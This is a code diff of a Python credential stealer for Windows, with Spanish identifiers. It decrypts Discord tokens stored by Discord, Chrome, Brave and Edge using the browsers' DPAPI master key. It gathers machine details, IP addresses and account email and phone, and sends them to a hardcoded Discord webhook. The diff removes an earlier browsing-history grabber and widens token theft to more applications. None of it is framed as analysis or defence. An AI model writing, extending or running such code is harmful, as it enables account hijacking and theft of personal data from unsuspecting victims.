@@ -9,8 +9,6 @@ import base64
 import win32crypt
 import platform
 import socket
-import sqlite3
-import tempfile
 from Crypto.Cipher import AES
 
 def get_master_key():
@@ -90,61 +88,112 @@ def obtener_tokens_reales():
                 
     return tokens
 
-######## Historial de Navegador (Generar TXT) ###############################
-
-def generar_archivo_historial():
-    history_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History"
-    txt_path = os.path.join(tempfile.gettempdir(), "historial.txt")
-    
-    if not os.path.exists(history_path):
-        with open(txt_path, "w", encoding="utf-8") as f:
-            f.write("No se encontró el historial de Chrome.")
-        return txt_path
-
-    temp_dir = tempfile.gettempdir()
-    temp_history = os.path.join(temp_dir, "history_temp")
-    
+def get_master_key_for_path(local_state_path):
+    if not os.path.exists(local_state_path):
+        return None
     try:
-        shutil.copy2(history_path, temp_history)
-    except Exception as e:
-        with open(txt_path, "w", encoding="utf-8") as f:
-            f.write(f"Error al copiar historial: {e}")
-        return txt_path
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        encrypted_key = encrypted_key[5:] 
+        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    except Exception:
+        return None
 
+def decrypt_val(buff, master_key):
     try:
-        conn = sqlite3.connect(temp_history)
-        cursor = conn.cursor()
-        
-        query = """
-            SELECT url, title, last_visit_time 
-            FROM urls 
-            ORDER BY last_visit_time DESC 
-            LIMIT 50
-        """
-        cursor.execute(query)
-        rows = cursor.fetchall()
-        
-        with open(txt_path, "w", encoding="utf-8") as f:
-            f.write("=== HISTORIAL DE NAVEGACION (CHROME) ===\n\n")
-            for row in rows:
-                url, title, _ = row
-                f.write(f"Título: {title}\nURL: {url}\n----------------------------------------\n")
-            
-        cursor.close()
-        conn.close()
-    except Exception as e:
-        with open(txt_path, "w", encoding="utf-8") as f:
-            f.write(f"Error al leer base de datos: {e}")
-    finally:
-        if os.path.exists(temp_history):
-            try:
-                os.remove(temp_history)
-            except:
-                pass
-                
-    return txt_path
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)[:-16].decode("utf-8", errors="ignore")
+        return decrypted_pass
+    except Exception:
+        return None
 
-######## Webhook #############################################################
+def obtener_tokens_multiples_rutas():
+    appdata = os.getenv("APPDATA")
+    local_appdata = os.getenv("LOCALAPPDATA")
+    
+    if not appdata or not local_appdata:
+        return []
+
+    
+    rutas_discord = {
+        "Discord Stable": {
+            "leveldb": os.path.join(appdata, "discord", "Local Storage", "leveldb"),
+            "local_state": os.path.join(appdata, "discord", "Local State")
+        },
+        "Discord PTB": {
+            "leveldb": os.path.join(appdata, "discordptb", "Local Storage", "leveldb"),
+            "local_state": os.path.join(appdata, "discordptb", "Local State")
+        },
+        "Discord Canary": {
+            "leveldb": os.path.join(appdata, "discordcanary", "Local Storage", "leveldb"),
+            "local_state": os.path.join(appdata, "discordcanary", "Local State")
+        },
+        "Google Chrome": {
+            "leveldb": os.path.join(local_appdata, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
+            "local_state": os.path.join(local_appdata, "Google", "Chrome", "User Data", "Local State")
+        },
+        "Brave": {
+            "leveldb": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
+            "local_state": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data", "Local State")
+        },
+        "Microsoft Edge": {
+            "leveldb": os.path.join(local_appdata, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
+            "local_state": os.path.join(local_appdata, "Microsoft", "Edge", "User Data", "Local State")
+        }
+    }
+
+    tokens = []
+
+    
+    for plataforma, paths in rutas_discord.items():
+        leveldb_path = paths["leveldb"]
+        local_state_path = paths["local_state"]
+
+        if not os.path.exists(leveldb_path):
+            continue
+
+        master_key = get_master_key_for_path(local_state_path)
+        if not master_key:
+            continue
+
+        
+        for file in os.listdir(leveldb_path):
+            if file.endswith(".ldb") or file.endswith(".log"):
+                file_path = os.path.join(leveldb_path, file)
+                try:
+                    with open(file_path, "rb") as f:
+                        content = f.read()
+                    
+                    pos = 0
+                    while True:
+                        pos = content.find(b"dQw4w9WgXcQ:", pos)
+                        if pos == -1:
+                            break
+                        
+                        try:
+                            end_pos = content.find(b'"', pos)
+                            if end_pos == -1:
+                                end_pos = pos + 150
+                            
+                            encrypted_block = content[pos:end_pos]
+                            if b":" in encrypted_block:
+                                raw_data = base64.b64decode(encrypted_block.split(b":")[1])
+                                token = decrypt_val(raw_data, master_key)
+                                if token and token not in tokens:
+                                    tokens.append(token)
+                        except Exception:
+                            pass
+                        
+                        pos += len(b"dQw4w9WgXcQ:")
+                except Exception:
+                    continue
+                    
+    return tokens
+
+########Webhook###############################################################
 
 WEBHOOK_URL_UNICO = "https://discord.com/api/webhooks/1557079500712575016/UgqNpfxAwc0j3moHXUZs6g5ljdLmwPfwQGjnQWAAr2WemT8v3XL_mhJNE-2kzWbCo2OA"
 
@@ -209,14 +258,14 @@ def enviar_reporte_completo(tokens):
     datos_pc = obtener_info_pc()
     
     descripcion = (
-        f"💻 **PC:** `{datos_pc['nombre_pc']}`\n"
-        f"⚙️ **OS:** `{datos_pc['os']}`\n"
-        f"🔧 **Procesador:** `{datos_pc['procesador']}`\n"
-        f"🎮 **Gráfica (GPU):** `{datos_pc['gpu']}`\n"
-        f"🌐 **IP Local:** `{datos_pc['ip_local']}`\n"
-        f"🌍 **IP Pública:** `{datos_pc['ip_publica']}`\n\n"
-        f"---\n"
-        f"🔑 **Tokens:**\n"
+        f" **PC:** `{datos_pc['nombre_pc']}`\n"
+        f"️ **OS:** `{datos_pc['os']}`\n"
+        f"️ **Procesador:** `{datos_pc['procesador']}`\n"
+        f" **Gráfica (GPU):** `{datos_pc['gpu']}`\n"
+        f" **IP Local:** `{datos_pc['ip_local']}`\n"
+        f" **IP Pública:** `{datos_pc['ip_publica']}`\n\n"
+        f"--- \n"
+        f" **Tokens :**\n"
     )
 
     if tokens:
@@ -232,7 +281,7 @@ def enviar_reporte_completo(tokens):
                 phone = user_data.get("phone", "No disponible")
                 
                 descripcion += (
-                    f"\n👤 **User:** `{username}` (ID: `{user_id}`)\n"
+                    f"\n **User:** `{username}` (ID: `{user_id}`)\n"
                     f"• **Email:** `{email}` | **Tel:** `{phone}`\n"
                     f"• **Token:**\n`{token_limpio}`\n"
                 )
@@ -247,9 +296,6 @@ def enviar_reporte_completo(tokens):
     else:
         descripcion += "_No se encontraron tokens._"
 
-    if len(descripcion) > 4000:
-        descripcion = descripcion[:3997] + "..."
-
     payload = {
         "embeds": [
             {
@@ -263,25 +309,17 @@ def enviar_reporte_completo(tokens):
         ]
     }
 
-    # Generar y adjuntar el archivo de texto con el historial
-    txt_path = generar_archivo_historial()
-    
     try:
-        with open(txt_path, "rb") as f:
-            files = {
-                "file": ("historial.txt", f, "text/plain")
-            }
-            requests.post(WEBHOOK_URL_UNICO, data={"payload_json": json.dumps(payload)}, files=files)
-    except Exception:
-        pass
-    
-    # Limpiar archivo temporal
-    if os.path.exists(txt_path):
-        try:
-            os.remove(txt_path)
-        except:
-            pass
+        response = requests.post(WEBHOOK_URL_UNICO, json=payload)
+        if response.status_code in [200, 204]:
+            print("")
+        else:
+            print(f"Error al enviar el webhook. Código: {response.status_code}")
+    except Exception as e:
+        print(f"Error de conexión al enviar el webhook: {e}")
 
 if __name__ == "__main__":
     tokens = obtener_tokens_reales() 
-    enviar_reporte_completo(tokens)
+    
+    if tokens:
+        enviar_reporte_completo(tokens)
